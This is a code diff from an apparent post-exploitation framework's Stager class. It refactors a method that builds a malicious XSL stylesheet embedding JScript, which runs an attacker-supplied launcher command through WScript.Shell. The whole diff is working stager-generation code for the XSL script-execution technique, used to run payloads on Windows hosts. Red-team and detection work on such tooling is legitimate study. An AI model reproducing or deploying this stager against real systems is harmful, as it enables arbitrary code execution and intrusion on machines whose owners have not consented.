@@ -147,13 +147,13 @@ class Stager:
         if launcher == "":
             log.error("[!] Error in launcher command generation.")
             return ""
-        else:
-            code = '<?xml version="1.0"?><stylesheet\n'
-            code += 'xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"\n'
-            code += 'xmlns:user="placeholder"\n'
-            code += 'version="1.0">\n'
-            code += '<output method="text"/><ms:script implements-prefix="user" language="JScript">'
-            code += '<![CDATA[var r = new ActiveXObject("WScript.Shell").Run("'
-            code += launcher
-            code += '");]]></ms:script></stylesheet>'
+
+        code = '<?xml version="1.0"?><stylesheet\n'
+        code += 'xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"\n'
+        code += 'xmlns:user="placeholder"\n'
+        code += 'version="1.0">\n'
+        code += '<output method="text"/><ms:script implements-prefix="user" language="JScript">'
+        code += '<![CDATA[var r = new ActiveXObject("WScript.Shell").Run("'
+        code += launcher
+        code += '");]]></ms:script></stylesheet>'
         return code
